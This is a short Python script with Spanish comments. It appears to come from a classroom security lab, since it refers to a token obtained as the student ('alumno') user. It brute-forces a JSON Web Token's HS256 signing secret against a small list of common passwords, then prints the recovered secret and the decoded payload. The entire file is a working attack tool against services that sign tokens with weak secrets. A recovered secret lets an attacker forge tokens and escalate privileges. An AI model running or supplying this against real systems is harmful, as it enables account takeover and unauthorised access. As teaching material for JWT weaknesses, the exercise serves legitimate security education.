import jwt

# El token que obtuviste previamente como usuario "alumno"
# (puedes copiarlo de tu archivo token.txt o pegarlo aquí directamente)
with open("token.txt") as f:
    token_alumno = f.read().strip()

# Pequeña lista de diccionarios o contraseñas comunes
diccionario = ["123456", "password", "secret", "secret123", "admin123", "clave123"]

print("Iniciando fuerza bruta sobre la firma del JWT...\n")

encontrado = None
for secreto in diccionario:
    try:
        # Intentamos decodificar y verificar la firma con cada palabra del diccionario
        payload = jwt.decode(token_alumno, secreto, algorithms=["HS256"])
        print(f"¡ÉXITO! Secreto encontrado: '{secreto}'")
        print("Payload descifrado:", payload)
        encontrado = secreto
        break
    except jwt.InvalidSignatureError:
        # La firma no coincide con este secreto, probamos con el siguiente
        continue

if not encontrado:
    print("No se pudo encontrar el secreto en el diccionario.")